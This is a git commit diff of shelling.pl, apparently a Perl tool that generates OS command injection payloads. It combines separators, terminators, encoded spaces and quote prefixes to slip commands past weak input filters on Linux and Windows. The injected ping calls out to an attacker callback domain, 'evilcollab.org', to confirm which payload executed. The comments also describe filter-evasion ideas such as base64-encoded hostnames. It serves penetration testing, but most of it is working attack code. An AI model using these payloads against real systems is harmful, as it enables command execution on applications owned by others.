42f2e5b2c94bba7fb9d206a4f3da36072a7b92b3
Julian Horoszkiewicz <ewilded@gmail.com>
2016-07-23 20:34:45 +0200

    Update shelling.pl
    Cosmetic stuff

--- shelling.pl
+++ shelling.pl
@@ -1,18 +1,19 @@
 #!/usr/bin/perl
 
-## Payload generator by ewilded (tuned up for command injection)
+## SHELLING - payload generator by ewilded, tuned for OS command injection
 
 use strict;
 
 # CONFIGURATION SECTION START
-my $COMMAND='ping';
-my $ARGUMENT='xPAYLOAD_MARK.sub.evilcollab.org';
+my $COMMAND='ping'; # sleep, echo, touch, wget, this could be nicely profiled, e.g. by a parameter called 'feedback_channel' or sth
+my $ARGUMENT='xPAYLOAD_MARK.sub.evilcollab.org'; # 
 # in this configuration example we are trying to ravage file upload mechanism in order to write arbitrary files to arbitrary location
 my $PAYL=$COMMAND.'ARGUMENT_SEPARATOR'.$ARGUMENT;
 my $payload_marking=1; # if  we want to mark each payload with a unique identifier, so we can know the winner when it hits the right place
+my $TARGET_OS='win'; # other options include 'win' and 'all', 'nix' is the default
 
 # Let's try to create proper nix command injection anatomy
-## we can deal with three types of shitty check filters:
+## we can deal with three types of porly written check filters:
 # 1) the ones that only force the string to begin properly, like ^\w+ 
 # 2) the ones that only force the string to end properly, like \w+$
 # 3) the ones that only force the string to have proper beginning and end, with a loophole inside of them, e.g. ^\w+\s+.*\w+$
@@ -21,23 +22,24 @@ my $payload_marking=1; # if  we want to mark each payload with a unique identifi
 
 # MALICIOUS_COMMAND=COMMAND+ARGUMENT_SEPARATOR
 # THE COMBINATION PATTERNS: 
-# 1) MALICIOUS_COMMAND (will this ever happen? yes it will, in argument injections like `$USER_SUPPLIED` or $(USER_SUPPLIED))
-# 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR (in case there was write and command separators were unallowed?)
+# 1) MALICIOUS_COMMAND (argument injections like `$USER_SUPPLIED` or $(USER_SUPPLIED))
+# 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR (in case there was write and command separators were unallowed)
 # 3) COMMAND_SEPARATOR+MALICIOUS_COMMAND (for simple injections with no filtering, like cat $USER_SUPPLIED
-# 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for simple injections with no filtering and appended fixed shite, like cat $USER_SUPPLIED something)
-# 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for simple injections like cat $USER_SUPPLIED something, with filtering like \w+$)
-# 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for injections with shitty filtering like ^\w+ and some appended fixed shite, like cat $USER_SUPPLIED something)
-# 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for injections with appended fixed shite, like cat $USER_SUPPLIED something, with shitty filtering like ^\w+\s+.*\w+$)
+# 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for simple injections with no filtering and appended some fixed content, like 'some_binary $USER_SUPPLIED -someflag')
+# 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for simple injections like 'cat $USER_SUPPLIED something', with filtering like \w+$)
+# 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for injections with weak filtering like ^\w+ and some appended fixed content, like 'cat $USER_SUPPLIED something')
+# 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for injections with appended fixed content, like 'cat $USER_SUPPLIED something', with weak filtering like ^\w+\s+.*\w+$)
 # 8) PREFIX+MALICIOUS_COMMAND+SUFFIX (`` and $() notations)
 
 # Why we do not combine COMMAND_SEPARATORS along with COMMAND_TERMINATORS in one payload: any quotes will be handled by the prefix stuff anyway, while any fixed appendices will be ignored due to separators instead of terminators (and if separator is not accepted, the command will fail anyway, so there is no point in trailing it with a terminator)... hence, terminators should be used only mutually exclusively with separators!
 
 # OTHER IDEAS (TODO)
-## Bad character avoidance; there have to be some alternative payloads evading filters for particular characters; for instance "ping shell.a.pentest.co" might fail if "." is not allowed; while "ping $((base64 -d c2hlbGwuYS5wZW50ZXN0LmNvLnVrCg==))" would work otherwise (provided that its other characers are not blocked ofc), it's just an example; we need to develop some sort of bad character evasion like in meterpreter encoder ;)
 # Additional evasive versions, e.g. double url-encode (or overlong utf) non-word characters (ARGUMENT_SEPARATORS, COMMAND_SEPARATORS, COMMAND_TERMINATORS)
-# WINDOWS SUPPORT
-# support for nested-quote injections ('" and "' prefix-suffix)
 # Generate test cases FROM the payloads
+# Command line argument passing (to help automate payload generation)
+# Result payloads ordered starting from the most probable ones, to optimize the number of requests sent
+# Review and analyse the basic payload cases for any missing or faulty payloads
+## Bad character avoidance; there have to be some alternative payloads evading filters for particular characters; for instance "ping shell.a.pentest.co" might fail if "." is not allowed; while "ping $((echo  c2hlbGwuYS5wZW50ZXN0LmNvLnVrCg==|base64 -d))" would work otherwise (provided that its other characers are not blocked ofc), it's just an example; we need to develop some sort of bad character evasion like in meterpreter encoder ;)
 
 
 my @BASE_PAYLOADS=(
@@ -46,20 +48,25 @@ $PAYL,
 '`'.$PAYL.'`'
 );
 
-my @ARGUMENT_SEPARATORS=('%20%20',"%09%09",'$IFS$9');
-my @COMMAND_SEPARATORS=('%0a%0a','%0d%0d',';','%26','|','<<D%0aD%0a');
+my @ARGUMENT_SEPARATORS=('%20%20',"%09%09"); 
+my @COMMAND_SEPARATORS=('%0a%0a','%0d%0d','%26','|'); #  <<D%0aD%0a is nice, but redundant, as it requires %0a
 my @COMMAND_TERMINATORS=("%00",'💩','%20%20#');# the first two make sense only if the command is saved into a file (script) or a database entry before being executed (in order to get rid of the hardcoded command shite if separators fail to get rid of its impact, or if dealing with some quoted injection
+
+if($TARGET_OS eq 'nix'||$TARGET_OS eq 'all')
+{
+	push(@COMMAND_SEPARATORS,';'); # semicolon does not terminate/separate commands in win cmd, hence it's nix-only option
+	push(@ARGUMENT_SEPARATORS,'$IFS$9'); # this is a nix-only hackt argument separator
+}
+if($TARGET_OS eq 'win'||$TARGET_OS eq 'all')
+{
+	push(@ARGUMENT_SEPARATORS,'%ProgramFiles:~10,1%'); # a cmd-specific hacky way to use space without a space, too bad it uses other dodgy characters :)
+}
 
 # %F0%9F%92%A9 encoded poo
 
 # invvvvv212.org','1', example.org for command injection into overlays of tools like whois. On the flip side, for file uploads these could be '.PNG', '.TXT','.DOC'optional list of suffixes to try (e.g. in order to bypass filters), used only with terminators
-my @PREFIXES=('foo.co.uk');
+my @PREFIXES=('foo.co.uk'); # this could be profiled as well (e.g. profiles like 'hostname','uname','all')
 my @PREFIX_SUFFIXES=('"',"'"); # for into-quoted string injections, like fixed_command '$USER_SUPPLIED' or fixed_command "$USER_SUPPLIED"
-
-# my %EVASIVE_RULES = (); # this is a collection of rules to apply in order to create alternative payload versions intended to bypass filters, e.g. 'script' => 'sCrIpt', 'script' => 'scr<script>ipt', 'UNION'=>'SeLunionect', 'tmp/' => 'tmp/../tmp/../tmp/../tmp/../tmp' and so on.
-# bash inline comments couls be used to evade weird blacklist-approaching filters, but these do not seem to be very popular (like with SQLi/XSS), so no need to implement these right now
-# CONFIGURATION SECTION STOP
-
 
 # automatically prefix prefixes with quotes in order to gain quoted injection compatibility
 my @tmp_prefixes=(@PREFIXES);
@@ -90,7 +97,7 @@ foreach my $arg_separator(@ARGUMENT_SEPARATORS)
 # Second, we fill up our output_payloads with successive combinations from the COMBINATION PATTERNS
 # 1) MALICIOUS_COMMAND - already there in its pure version, nice one!
 
-# 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR (in case there was write and command separators were unallowed?)
+# 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR 
 foreach my $base_payload(@BASE_PAYLOADS)
 {
 	foreach my $command_terminator((@COMMAND_TERMINATORS,@COMMAND_SEPARATORS))
@@ -109,7 +116,7 @@ foreach my $base_payload(@BASE_PAYLOADS)
 	}
 }
 
-# 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for simple injections with no filtering and appended fixed shite, like cat $USER_SUPPLIED something)
+# 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR 
 foreach my $base_payload(@BASE_PAYLOADS)
 {
 	foreach my $command_separator(@COMMAND_SEPARATORS)
@@ -120,7 +127,7 @@ foreach my $base_payload(@BASE_PAYLOADS)
 }
 
 
-# 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for simple injections like cat $USER_SUPPLIED something, with filtering like \w+$)
+# 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX
 foreach my $base_payload(@BASE_PAYLOADS)
 {
 	foreach my $command_separator(@COMMAND_SEPARATORS)
@@ -134,7 +141,7 @@ foreach my $base_payload(@BASE_PAYLOADS)
 	}
 }
 
-# 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR (for injections with shitty filtering like ^\w+ and some appended fixed shite, like cat $USER_SUPPLIED something)
+# 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR
 foreach my $base_payload(@BASE_PAYLOADS)
 {
 	foreach my $command_separator(@COMMAND_SEPARATORS)
@@ -156,7 +163,7 @@ foreach my $base_payload(@BASE_PAYLOADS)
 	}
 }
 
-# 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX (for injections with appended fixed shite, like cat $USER_SUPPLIED something, with shitty filtering like ^\w+\s+.*\w+$)
+# 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX 
 foreach my $base_payload(@BASE_PAYLOADS)
 {
 	foreach my $command_separator(@COMMAND_SEPARATORS)
